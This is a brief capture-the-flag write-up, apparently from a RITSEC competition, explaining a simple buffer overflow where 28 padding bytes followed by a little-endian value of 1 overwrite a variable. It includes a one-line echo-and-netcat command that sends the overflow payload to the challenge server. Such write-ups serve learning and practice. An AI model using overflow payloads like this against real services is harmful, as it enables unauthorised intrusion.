ezpwn
=====
Kill self trying to use gdb-peda and IDA to figure out an easy buffer overflow.

The program desires the value of this one variable to be "1", except you need to follow endianness. oof.

The actual solution needs 28 bytes of overflow instead of the 32 in the given program.

``echo -e "FFFFFFFFEEEEEEEEDDDDDDDDCCCC\x01\x00\x00\x00" | nc fun.ritsec.club 8001``
